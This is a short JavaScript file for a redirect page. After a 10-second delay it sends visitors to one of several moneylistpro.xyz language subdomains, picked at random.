// script.js - redirect-site

const sites = [
    "https://en.moneylistpro.xyz", 
    "https://es.moneylistpro.xyz", 
    "https://ru.moneylistpro.xyz", 
    "https://moneylistpro.xyz" 
];

window.addEventListener("load", () => {
    const randomIndex = Math.floor(Math.random() * sites.length);
    setTimeout(() => {
        window.location.href = sites[randomIndex];
    }, 10000); // Redireciona após 10 segundos
});
